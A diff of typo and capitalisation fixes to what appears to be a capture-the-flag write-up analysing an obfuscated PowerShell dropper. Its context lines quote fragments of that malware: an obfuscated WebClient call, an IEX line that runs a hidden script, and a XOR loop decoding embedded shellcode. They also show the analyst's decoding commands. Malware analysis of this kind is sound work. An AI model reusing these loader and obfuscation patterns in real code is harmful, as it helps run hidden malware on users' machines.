@@ -27,7 +27,7 @@ that is read.
 We could actually run this code in a Windows environment but it is also
 totally possible to emulate its behaviour from a *Nix shell, which I did.
 
-Providing that the base64 string is a file called `b64` we have:
+Provided that the base64 string is a file called `b64` we have:
 
 ```
 $ cat b64 | base64 -D | gzip -dc > out
@@ -83,16 +83,16 @@ ${W`eBKey} = (.("{0}{1}{2}" -f 'Ne','w-Objec','t') ("{2}{3}{4}{1}{0}" -f 'nt','b
 If ([IntPtr]::size -eq 8) { start-job { param($a) IEX $a } -RunAs32 -Argument $None | wait-job | Receive-Job } else { IEX $None }
 ```
 
-This Powershell script seems to do a lot but is actually quite simple:
+This PowerShell script seems to do a lot but is actually quite simple:
 
-* Create a variable named `None` that actually contains another Powershell
+* Create a variable named `None` that actually contains another PowerShell
   script
 * Invoke this script
 
 And regarding the so-called script:
 
 * Define a function `send_postie` (does not look important, let's ignore it)
-* Define a function `get_java`, that does some shaddy business (let's ignore it too)
+* Define a function `get_java`, that does some shady business (let's ignore it too)
 * Define a function `BxoriT` that looks much more interesting (array of bytes, 
   xor...) but also obfuscated (more on that later). This function takes a
   parameter that is called `key`.
@@ -100,7 +100,7 @@ And regarding the so-called script:
   string
 * Call `BxoriT` with `13` as parameter
 * Call `BxoriT` again, with `37` as parameter
-* Perform some more obfuscated business (at this point I stoped reading and
+* Perform some more obfuscated business (at this point I stopped reading and
   wanted to take a look at `BxoriT` first)
 
 The `BxoriT` function uses
@@ -151,7 +151,7 @@ for ($x = 0; $x -lt $BxoiT.Count; $x++) { $BxoiT[$x] = $BxoiT[$x]-BxoR$key };
 ```
 
 So it is a simple for-loop that iterates over `BxoiT` (the byte array created
-from the base64) and XOR each byte using the key passed as parameter to
+from the base64) and XORs each byte using the key passed as parameter to
 `BxoriT`. I did not get that immediately because of this part of the
 expression: `$BxoiT[$x]-BxoR$key`. I thought it was: `$BxoiT[$x] - BxoR$key`,
 which does not make any sense as `BxoR` would be an undefined name. If we
@@ -184,7 +184,7 @@ with open("source", "rb") as src_file:
         dest_file.write(result)
 ```
 
-The result is written in a file as it contains binary data. Providing that
+The result is written in a file as it contains binary data. Provided that
 the base64 is in a file called `source`:
 
 ```
@@ -227,5 +227,5 @@ Final flag: `dctf{L1ttl3_r3D-sh3llc0d3_th@t_1-c4n_dr0p}`.
 
 A few things learned from this challenge:
 
-* Simple Powershell scripts can most likely be emulated in a *NIX environment
+* Simple PowerShell scripts can most likely be emulated in a *NIX environment
 * Do not try to understand code that is not used at the end
